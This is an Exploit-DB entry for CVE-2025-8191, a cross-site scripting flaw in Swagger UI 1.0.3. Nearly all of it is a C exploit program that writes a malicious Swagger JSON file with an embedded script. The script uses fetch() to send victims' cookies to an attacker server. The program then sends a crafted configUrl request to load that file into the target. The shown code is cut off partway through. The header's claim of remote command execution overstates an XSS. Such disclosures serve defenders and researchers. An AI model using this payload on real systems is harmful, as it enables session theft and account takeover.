---
title: [remote] Swagger UI 1.0.3 - Cross-Site Scripting (XSS)
url: https://www.exploit-db.com/exploits/52392
source: Exploit-DB.com RSS Feed
date: 2025-08-04
fetch_date: 2025-10-07T00:15:00.891501
---

# [remote] Swagger UI 1.0.3 - Cross-Site Scripting (XSS)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Swagger UI 1.0.3 - Cross-Site Scripting (XSS)

#### EDB-ID:

###### 52392

#### CVE:

###### [2025-8191](https://nvd.nist.gov/vuln/detail/CVE-2025-8191)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-03

---

**Vulnerable App:**

```
/*
 * Author       : Byte Reaper
 * Telegram     : @ByteReaper0
 * CVE          : CVE-2025-8191
 * Title : Swagger UI 1.0.3 - Cross-Site Scripting (XSS)
 * Description : CVE-2025-8191, a vulnerability in the Swagger UI service due to poor description parameter filtering, leading to command execution on a remote server.
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "argparse.h"
#include <curl/curl.h>

int portSel = 0;
int portServerSel = 0;
int selectFile = 0;
const char *targetUrl = NULL;
const char *cookies   = NULL;
const char *server    = NULL;
const char *yourFile  = NULL;
const char *payloadFile = "xss.json";
int targetPort = 0;
int yourPort = 0;
int verbose = 0;
int useCookies  = 0;
struct Mem
{
    char *buffer;
    size_t len;
};

void exitAssembly()
{
    __asm__ volatile
    (
        "mov $231, %%rax\n\t"
        "xor %%rdi, %%rdi\n\t"
        "syscall\n\t"
        :
        :
        :"rax",
         "rdi"
    );
}
size_t write_cb(void *ptr,
                size_t size, size_t nmemb,
                void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        printf("\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitAssembly();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
void createFile(const char *filename,
                const char *server)
{
    FILE *f = fopen(filename, "w");
    if (f == NULL)
    {
        printf("\e[1;31m[-] Error Create file (xss.json)!\e[0m\n");
        exitAssembly();
    }

    char payloadBuf[2048];
    int lenFile = snprintf(
        payloadBuf,
        sizeof(payloadBuf),
                           "{\n"
                           "  \"swagger\": \"2.0\",\n"
                           "  \"info\": {\n"
                           "    \"version\": \"1.0.0\",\n"
                           "    \"title\": \"XSS Injection Demo\",\n"
                           "    \"description\": \"<script>fetch('%s/steal?c='+encodeURIComponent(document.cookie))</script>\"\n"
                           "  },\n"
                           "  \"paths\": {}\n"
                           "}",
                           server
    );

    if (lenFile <= 0 || lenFile >= sizeof(payloadBuf))
    {
        printf("\e[1;31m[-] File payload too large!\e[0m\n");
        fclose(f);
        exitAssembly();
    }
    fwrite(payloadBuf,
           1,
           lenFile,
           f);
    fclose(f);
    printf("\e[1;34m[+] File name: %s\e[0m\n",
           filename);
    printf("\e[1;34m[+] File created successfully.\e[0m\n");
    printf("\e[1;35m============================= [PAYLOAD] =============================\e[0m\n");
    printf("\e[1;34m[+] Payload content :\n%s\e[0m\n",
           payloadBuf);
    printf("\e[1;35m====================================================================\e[0m\n");

}
void sendRequest(const char *baseUrl,
                 int targetPort,
                 const char *server,
                 const char *payloadFile)
{
    const char *filename = "xss.json";
    createFile(filename, server);
    CURL *curl = curl_easy_init();
    CURLcode res;
    char full[4000];
    if (curl == NULL)
    {
        printf("\e[1;31m[-] Error Create Object CURL !\e[0m\n");
        exitAssembly();
    }
    struct Mem server_Rsponse =
    {
        NULL,
        0
    };
    server_Rsponse.buffer = NULL ;
    server_Rsponse.len = 0;
    if (curl)
    {

        if (portSel)
        {
            int len1 = snprintf(full,
                                sizeof(full),
                                "%s:%d/swagger-ui/index.html?configUrl=%s/%s",
                                baseUrl,
                                targetPort,
                                server,
                                payloadFile);
            if (len1 < 0 || len1 >= (int)sizeof(full))
            {
                printf("\e[1;31m[-] URL is Long !\e[0m\n");
                printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len1);
                exitAssembly();
            }
        }
        if (portServerSel)
        {
            int len2 = snprintf(full,
                                sizeof(full),
                                "%s/swagger-ui/index.html?configUrl=%s:%d/%s",
                                baseUrl,
                                server,
                                yourPort,
                                payloadFile);

            if (len2 < 0 || len2 >= (int)sizeof(full))
            {
                printf("\e[1;31m[-] URL is Long !\e[0m\n");
                printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len2);
                exitAssembly();
            }

        }
        if (selectFile)
        {
            int len3 = snprintf(full,
                                sizeof(full),
                                "%s:%d/swagger-ui/index.html?configUrl=%s/%s",
                                baseUrl,
                                targetPort,
                                server,
                                yourFile);
            if (len3 < 0 || len3 >= (int)sizeof(full))
            {
                printf("\e[1;31m[-] URL is Long !\e[0m\n");
                printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len3);
                exitAssembly();
            }
        }
        else
        {
            int len4 = snprintf(full,
                                sizeof(full),
                                "%s:%d/swagger-ui/index.html?configUrl=%s/%s",
                                baseUrl,
                                targetPort,
                                server,
                                payloadFile);
            if (len4 < 0 || len4 >= (int)sizeof(full))
            {
                printf("\e[1;31m[-] URL is Long !\e[0m\n");
                printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len4);
                exitAssembly();
            }
        }
        curl_easy_setopt(curl,
                         CURLOPT_URL,
                         full);
        if (useCookies)
        {
            curl_easy_setopt(curl,
                             CURLOPT_COOKIEFILE,
                             cookies);
            curl_easy_setopt(curl,
                             CURLOPT_COOKIEJAR,
                             cookies);

        }
        curl_easy_setopt(curl,
                         CURLOPT_FOLLOWLOCATION,
                         1L);
        curl_easy_setopt(curl,
                         CURLOPT_WRITEFUNCTION,
                         write_cb);
        if (verbose)
        {
            printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
            curl_easy_setopt(curl,
                             CURLOPT_VERBOSE,
                             1L);
        }
        curl_easy_setopt(curl,
               ...